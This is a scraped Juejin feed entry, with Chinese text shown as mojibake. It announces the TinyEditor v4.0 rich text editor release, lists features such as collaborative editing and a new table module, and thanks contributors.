<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/395921e3bc834df69ddaa866799a256b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=tEEuj%2BvCSqGiTbpSg0D1aBhqirE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-17">15. é™æ€ç«™ç‚¹</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d638ec0ced104652b0fde1a45667a204~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=Dd0exnmnqUl0nspOZTzZj7aSkEI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18">16. GraphQL</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab485357b7a8406386bbdba8a3280393~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=u5t0Xk1%2Fu0aWb9iD%2BU5qnKqAvf0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19">æœ€å</h2>
<p>ä½œä¸ºå‡†å‰ç«¯å¼€å‘ä¸“å®¶çš„ä½ ï¼Œç¬¬ä¸€æ—¶é—´è·å–å‰ç«¯èµ„è®¯ã€æŠ€æœ¯å¹²è´§ã€AI è¯¾ç¨‹ï¼Œé‚£ä¸å¾—å…³æ³¨ä¸‹æˆ‘çš„å…¬ä¼—å·ã€Œå†´ç¾½ã€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ‰å†æ—¶1å¹´ï¼ŒTinyEditor v4.0 æ­£å¼å‘å¸ƒï¼]]></title>    <link>https://juejin.cn/post/7592089325913522176</link>    <guid>https://juejin.cn/post/7592089325913522176</guid>    <pubDate>2026-01-07T02:28:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592089325913522176" data-draft-id="7591465142452469812" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ‰å†æ—¶1å¹´ï¼ŒTinyEditor v4.0 æ­£å¼å‘å¸ƒï¼"/> <meta itemprop="keywords" content="å‰ç«¯,TypeScript,å¼€æº"/> <meta itemprop="datePublished" content="2026-01-07T02:28:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å¼€æºæ˜Ÿçƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1504599026445150"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ‰å†æ—¶1å¹´ï¼ŒTinyEditor v4.0 æ­£å¼å‘å¸ƒï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1504599026445150/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å¼€æºæ˜Ÿçƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T02:28:46.000Z" title="Wed Jan 07 2026 02:28:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ å¥½ï¼Œæˆ‘æ˜¯ Kagolï¼Œä¸ªäººå…¬ä¼—å·ï¼š<code>å‰ç«¯å¼€æºæ˜Ÿçƒ</code>ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2F" target="_blank" title="https://opentiny.github.io/tiny-editor/" ref="nofollow noopener noreferrer">TinyEditor</a> æ˜¯ä¸€ä¸ªåŸºäº Quill 2.0 çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œåœ¨ Quill åŸºç¡€ä¸Šæ‰©å±•äº†ä¸°å¯Œçš„æ¨¡å—å’Œæ ¼å¼ï¼Œæ¡†æ¶æ— å…³ã€åŠŸèƒ½å¼ºå¤§ã€å¼€ç®±å³ç”¨ã€‚</p>
<ul>
<li>æºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor%2F" target="_blank" title="https://github.com/opentiny/tiny-editor/" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a></li>
<li>å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2F" target="_blank" title="https://opentiny.github.io/tiny-editor/" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></li>
</ul>
<p>å»å¹´1æœˆ2æ—¥ï¼Œæˆ‘ä»¬å‘å¸ƒäº† v3.25 ç‰ˆæœ¬ï¼ŒåŠŸèƒ½åŸºæœ¬å·²ç»å®Œå¤‡ï¼Œä¹‹å v3.x ç‰ˆæœ¬è¿›å…¥äº†ç»´æŠ¤æœŸï¼ŒåŒæ—¶å¼€å¯äº†æ¼«é•¿çš„ v4.0 ç‰ˆæœ¬çš„å¼€å‘ï¼Œv4.0 çš„æ ¸å¿ƒç›®æ ‡æ˜¯ä½“éªŒä¼˜åŒ–å’Œç¨³å®šæ€§æå‡ï¼Œå¹¶æ”¯æŒå¤šäººååŒç¼–è¾‘ã€‚</p>
<p>åœ¨é•¿è¾¾1å¹´çš„å¼€å‘å’Œæ‰“ç£¨åï¼Œæˆ‘ä»¬è£å¹¸åœ°å®£å¸ƒÂ <strong>TinyEditor v4.0</strong>Â æ­£å¼å‘å¸ƒï¼è¿™ä¸ªç‰ˆæœ¬æ±‡èšäº†å›¢é˜Ÿçš„å¿ƒè¡€ï¼Œå¸¦æ¥äº†æ¿€åŠ¨äººå¿ƒå¤šäººååŒç¼–è¾‘æ–°åŠŸèƒ½ã€ä»¥åŠå¤§é‡ä½“éªŒä¼˜åŒ–å’Œç¨³å®šæ€§æ”¹è¿›ã€‚</p>
<p>é‡ç‚¹ç‰¹æ€§ï¼š</p>
<ul>
<li>æ”¯æŒå¤šäººååŒç¼–è¾‘ï¼šä¸€èµ·åœ¨ç¼–è¾‘å™¨å†™ï¼ˆç©ï¼‰æ–‡æ¡£ï¼ˆè´ªåƒè›‡æ¸¸æˆæ‘¸é±¼ï¼‰ğŸ¶</li>
<li>åŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fquill-modules%2Fquill-table-up" target="_blank" title="https://github.com/quill-modules/quill-table-up" ref="nofollow noopener noreferrer">quill-table-up</a> çš„æ–°è¡¨æ ¼æ–¹æ¡ˆï¼šè¡¨æ ¼æ“ä½œä½“éªŒ++âš¡ï¸</li>
<li>åŸºäº <code>emoji-mart</code> çš„ Emoji è¡¨æƒ…ï¼šè¡¨æƒ…å…šæœ€çˆ±ğŸ˜</li>
<li>æ”¯æŒæ–œæ†èœå•å’Œä¸°å¯Œçš„å¿«æ·é”®ï¼šé”®ç›˜æµçš„ç¦éŸ³ğŸ˜„</li>
<li>å›¾ç‰‡/è§†é¢‘/æ–‡ä»¶ä¸Šä¼ ä½“éªŒä¼˜åŒ–ğŸŒ„</li>
</ul>
<p>è¯¦ç»†çš„ Release Notes è¯·å‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor%2Freleases%2Ftag%2Fv4.0.0" target="_blank" title="https://github.com/opentiny/tiny-editor/releases/tag/v4.0.0" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a></p>
<p>æ¬¢è¿å®‰è£… v4.0 ç‰ˆæœ¬ä½“éªŒï¼š</p>
<pre><code class="hljs language-shell" lang="shell">npm i @opentiny/fluent-editor@4.0.0
</code></pre>
<h2 data-id="heading-0">1 äº®ç‚¹ç‰¹æ€§</h2>
<h3 data-id="heading-1">1.1 å¤šäººåä½œç¼–è¾‘</h3>
<p>v4.0 æœ€é‡ç£…çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯å¼•å…¥äº†<strong>å®Œæ•´çš„åä½œç¼–è¾‘èƒ½åŠ›</strong>ã€‚æˆ‘ä»¬é›†æˆäº† quill-cursor æ¨¡å—ï¼Œæ”¯æŒå¤šäººå®æ—¶åä½œç¼–è¾‘ï¼Œå¹¶æä¾›äº†ç‹¬ç«‹çš„ npm åŒ…ä¾›å¼€å‘è€…é›†æˆã€‚æ— è®ºæ˜¯éœ€è¦ç¦»çº¿æ”¯æŒè¿˜æ˜¯äº‘ç«¯åä½œï¼ŒTinyEditor éƒ½èƒ½èƒœä»»ã€‚</p>
<p>ä½ å¯ä»¥åœ¨æˆ‘ä»¬çš„æ¼”ç¤ºé¡¹ç›®ä¸­è¿›è¡Œä½“éªŒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fprojects%2F" target="_blank" title="https://opentiny.github.io/tiny-editor/projects/" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f5877094758471cae8f5098e8a82052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=cxikW09j%2BhFqcFJ5WIYxzOya0Bg%3D" alt="TinyEditor ååŒç¼–è¾‘æ•ˆæœ" loading="lazy"/></p>
<p>å…³äºååŒç¼–è¾‘æ›´è¯¦ç»†çš„ä»‹ç»ï¼Œå‚è€ƒï¼š<a href="https://juejin.cn/post/7565940210149064756" target="_blank" title="https://juejin.cn/post/7565940210149064756">å¦‚ä½•ä½¿ç”¨ TinyEditor å¿«é€Ÿéƒ¨ç½²ä¸€ä¸ªå¤šäººååŒå¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼Ÿ</a></p>
<h3 data-id="heading-2">1.2 è¡¨æ ¼èƒ½åŠ›å‡çº§</h3>
<p>é›†æˆäº†Â <strong>table-up</strong>Â æ¨¡å—ï¼Œå¤§å¹…æå‡äº†è¡¨æ ¼ç¼–è¾‘å’Œæ“ä½œèƒ½åŠ›ï¼Œæ”¯æŒæ›´å¤æ‚çš„è¡¨æ ¼åœºæ™¯ã€‚</p>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fdocs%2Fdemo%2Ftable-up" target="_blank" title="https://opentiny.github.io/tiny-editor/docs/demo/table-up" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0dbc39ec97f244b9b259517aacb4d683~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=eSdfQ63Xv54PUxK3QR5YqdWONn4%3D" alt="TinyEditor è¡¨æ ¼æ¨¡å—æ•ˆæœ" loading="lazy"/></p>
<p>è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://juejin.cn/post/7527182608340484139#heading-0" target="_blank" title="https://juejin.cn/post/7527182608340484139#heading-0">æ›´å¼ºå¤§çš„è¡¨æ ¼</a></p>
<h3 data-id="heading-3">1.3 æ›´ä¸°å¯Œçš„ Emoji è¡¨æƒ…ğŸ˜˜</h3>
<ul>
<li>é›†æˆÂ <strong>emoji-mart</strong>ï¼Œæä¾›ä¸°å¯Œçš„è¡¨æƒ…é€‰æ‹©</li>
<li>ä¿®å¤äº†æ’å…¥è¡¨æƒ…åçš„å…‰æ ‡ä½ç½®é—®é¢˜</li>
<li>å®Œå–„äº†è¡¨æƒ…æ’å…¥çš„äº¤äº’ä½“éªŒ</li>
</ul>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fdocs%2Fdemo%2Femoji" target="_blank" title="https://opentiny.github.io/tiny-editor/docs/demo/emoji" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7b7f590ed114d46b5fb1185f6537854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=ntI6K0zJVyK6vear4RUpXOodM1Y%3D" alt="TinyEditor Emoji è¡¨æƒ…" loading="lazy"/></p>
<p>è¯¦ç»†ä»‹ç»å¯ä»¥å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼š<a href="https://juejin.cn/post/7527182608340484139#heading-1" target="_blank" title="https://juejin.cn/post/7527182608340484139#heading-1">æ›´ä¸°å¯Œçš„è¡¨æƒ…</a></p>
<h3 data-id="heading-4">1.4 å¿«æ·é”®å’Œå¿«é€Ÿèœå•</h3>
<p>æ–°å¢äº†å¼ºå¤§çš„å¿«æ·é”®ç³»ç»Ÿå’Œå¿«é€Ÿèœå•åŠŸèƒ½ï¼Œè®©é«˜çº§ç”¨æˆ·èƒ½å¤Ÿæ›´é«˜æ•ˆåœ°æ“ä½œç¼–è¾‘å™¨ã€‚</p>
<p>ä½“éªŒåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.github.io%2Ftiny-editor%2Fprojects%2F" target="_blank" title="https://opentiny.github.io/tiny-editor/projects/" ref="nofollow noopener noreferrer">opentiny.github.io/tiny-editorâ€¦</a></p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/addf8f3ab20b4b74b371eb45300968e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=EL%2F7o4la6ffhzn2%2FlZ7nNV5uSsk%3D" alt="å¿«æ·é”®.gif" loading="lazy"/></p>
<h3 data-id="heading-5">1.5 é¢œè‰²é€‰æ‹©å™¨å‡çº§</h3>
<p>è‡ªå®šä¹‰é¢œè‰²é€‰æ‹©å™¨ç°åœ¨èƒ½ä¿å­˜å½“å‰é€‰æ‹©ï¼Œå¹¶æ”¯æŒæ·»åŠ æ›´å¤šé¢œè‰²ã€‚</p>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a40da4b35d2543c6bff39fbf1a61c66a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5byA5rqQ5pif55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768357725&amp;x-signature=DMZbLG7yeY8wVbjPi%2Fkb8VpOGDE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">1.6 æ–‡æœ¬æ¨¡æ¿ä¸å›½é™…åŒ–</h3>
<ul>
<li>æ”¯æŒ i18n æ–‡æœ¬æ¨¡æ¿æ›¿æ¢</li>
<li>å®Œå–„äº†å›½é™…åŒ–ç¿»è¯‘ï¼ˆheaderã€picker ç­‰ç»„ä»¶ï¼‰</li>
<li>æ›´å¥½çš„å¤šè¯­è¨€æ”¯æŒä½“éªŒ</li>
</ul>
<h3 data-id="heading-7">1.7 å›¾ç‰‡å’Œæ–‡ä»¶å¢å¼º</h3>
<ul>
<li><strong>å›¾ç‰‡å·¥å…·æ </strong>ï¼šé€‰ä¸­å›¾ç‰‡æ—¶æ˜¾ç¤ºä¸“é—¨çš„æ“ä½œå·¥å…·æ </li>
<li><strong>è‡ªå®šä¹‰ä¸Šä¼ </strong>ï¼šå¢åŠ Â <code>allowInvalidUrl</code>Â é€‰é¡¹ï¼Œæ”¯æŒ Electron ç­‰ç‰¹å®šåœºæ™¯</li>
<li><strong>æ”¹è¿›çš„ä¸Šä¼ é€»è¾‘</strong>ï¼šä¼˜åŒ–äº†å¤±è´¥çŠ¶æ€çš„å¤„ç†</li>
</ul>
<h2 data-id="heading-8">2 æŠ€æœ¯æ”¹è¿›</h2>
<h3 data-id="heading-9">2.1 æ„å»ºå’Œå·¥ç¨‹åŒ–</h3>
<ul>
<li>ä¿®å¤äº† SSR æ„å»ºé—®é¢˜</li>
<li>ä¼˜åŒ–äº† Vite é…ç½®ï¼Œè§£å†³äº† PostCSS å’Œ Tailwind çš„å…¼å®¹æ€§é—®é¢˜</li>
<li>æ”¹è¿›äº† SCSS æ–‡ä»¶å¼•å…¥æ–¹å¼</li>
<li>è¾“å‡ºæ–‡ä»¶åç§°ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-10">2.2 ä¾èµ–ç®¡ç†</h3>
<ul>
<li>å¤–éƒ¨åŒ– emoji-mart å’Œ floating-ui ä¾èµ–ï¼Œå‡å°‘åŒ…ä½“ç§¯</li>
<li>ç§»é™¤äº† better-table å’Œ lodash-esï¼Œä¼˜åŒ–ä¾èµ–æ ‘</li>
</ul>
<h3 data-id="heading-11">2.3 ä»£ç è´¨é‡</h3>
<ul>
<li>å®Œæ•´çš„æµ‹è¯•è¦†ç›–ç‡æå‡</li>
<li>é‡æ„ä¼˜åŒ–ï¼šç§»é™¤å†—ä½™ä»£ç </li>
<li>API æ ‡å‡†åŒ–ï¼š<code>scrollIntoView</code>Â â†’Â <code>scrollSelectionIntoView</code></li>
<li>ç¤ºä¾‹ä»£ç  <code>async/await</code> æ”¹é€ ï¼Œä»£ç ç°ä»£åŒ–</li>
</ul>
<h3 data-id="heading-12">2.4 ç±»å‹å®‰å…¨</h3>
<ul>
<li>ä¿®å¤äº†å›  TypeScript ç±»å‹å¯¼è‡´çš„ç¼–è¯‘é”™è¯¯</li>
<li>æ”¹è¿›äº†ç±»å‹å®šä¹‰</li>
</ul>
<h3 data-id="heading-13">2.5 API å¯¼å‡ºå¢å¼º</h3>
<p>v4.0 å¯¼å‡ºäº†å·¥å…·æ é…ç½®å¸¸é‡ï¼Œæ–¹ä¾¿å¼€å‘è€…å®šåˆ¶ï¼š</p>
<ul>
<li><code>DEFAULT_TOOLBAR</code>ï¼šé»˜è®¤å·¥å…·æ é…ç½®</li>
<li><code>FULL_TOOLBAR</code>ï¼šå®Œæ•´å·¥å…·æ é…ç½®</li>
</ul>
<h3 data-id="heading-14">2.6 å¢åŠ è‡ªåŠ¨å‘åŒ…å·¥ä½œæµ</h3>
<ul>
<li>å¢åŠ  auto-publish / auto-deploy ç­‰è‡ªåŠ¨åŒ–å·¥ä½œæµï¼Œæ”¯æŒæ‰“ tag ä¹‹åè‡ªåŠ¨å‘ç‰ˆæœ¬ã€ç”Ÿæˆ Release Notes</li>
<li>PR é—¨ç¦åœ¨å•å…ƒæµ‹è¯•åŸºç¡€ä¸Šå¢åŠ  npm åŒ…å’Œç½‘ç«™æ„å»ºï¼Œç¡®ä¿åˆå…¥ PR ä¹‹å‰ï¼Œnpm åŒ…æ„å»ºå’Œç½‘ç«™æ„å»ºæ˜¯æ­£å¸¸çš„ï¼Œé€šè¿‡è‡ªåŠ¨åŒ–æ–¹å¼ä¿éšœç‰ˆæœ¬è´¨é‡ã€‚</li>
</ul>
<h2 data-id="heading-15">3 é—®é¢˜ä¿®å¤</h2>
<p>v4.0 ä¿®å¤äº†å¤§é‡å·²çŸ¥é—®é¢˜ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å·¥å…·æ é€‰æ‹©å™¨ä¸è·Ÿéšå…‰æ ‡å˜åŒ–çš„é—®é¢˜</li>
<li>è¡Œé«˜ä½œç”¨åŸŸé—®é¢˜</li>
<li>åˆ—è¡¨æ ·å¼æ˜¾ç¤ºä¸æ­£ç¡®</li>
<li>èƒŒæ™¯è‰² SVG å›¾æ ‡é—®é¢˜</li>
<li>VitePress é»˜è®¤æ ·å¼å½±å“çš„é—®é¢˜</li>
<li>è‡ªå®šä¹‰ä¸Šä¼ å¤±è´¥æ—¶è¡¨æ ¼æ•°æ®ç»“æ„ç ´åçš„é—®é¢˜</li>
<li>å¤šé¡¹æ–‡æ¡£å’Œå›½é™…åŒ–ç¿»è¯‘é—®é¢˜</li>
</ul>
<h2 data-id="heading-16">4 ç¤¾åŒºè´¡çŒ®</h2>
<p>æ„Ÿè°¢æ‰€æœ‰ä¸º v4.0 åšå‡ºè´¡çŒ®çš„å¼€å‘è€…ï¼ä½ ä»¬çš„è¾›å‹¤ä»˜å‡ºè®© TinyEditor å˜å¾—æ›´å¥½ï¼</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fchenxi-20" target="_blank" title="https://github.com/chenxi-20" ref="nofollow noopener noreferrer">@chenxi-20</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGaoNeng-wWw" target="_blank" title="https://github.com/GaoNeng-wWw" ref="nofollow noopener noreferrer">@GaoNeng-wWw</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjany55555" target="_blank" title="https://github.com/jany55555" ref="nofollow noopener noreferrer">@jany55555</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fqwangry" target="_blank" title="https://github.com/qwangry" ref="nofollow noopener noreferrer">@qwangry</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshenyaofeng" target="_blank" title="https://github.com/shenyaofeng" ref="nofollow noopener noreferrer">@shenyaofeng</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvaebe" target="_blank" title="https://github.com/vaebe" ref="nofollow noopener noreferrer">@vaebe</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwuyiping0628" target="_blank" title="https://github.com/wuyiping0628" ref="nofollow noopener noreferrer">@wuyiping0628</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYinlin124" target="_blank" title="https://github.com/Yinlin124" ref="nofollow noopener noreferrer">@Yinlin124</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzzxming" target="_blank" title="https://github.com/zzxming" ref="nofollow noopener noreferrer">@zzxming</a></li>
</ul>
<blockquote>
<p>æ³¨ï¼šæ’åä¸åˆ†å…ˆåï¼ŒæŒ‰åå­—é¦–å­—æ¯æ’åºã€‚</p>
</blockquote>
<p>å¦‚æœä½ æœ‰ä»»ä½•å»ºè®®æˆ–åé¦ˆï¼Œæ¬¢è¿é€šè¿‡Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-editor%2Fissues" target="_blank" title="https://github.com/opentiny/tiny-editor/issues" ref="nofollow noopener noreferrer">GitHub Issues</a>Â ä¸æˆ‘ä»¬è”ç³»ã€‚</p>
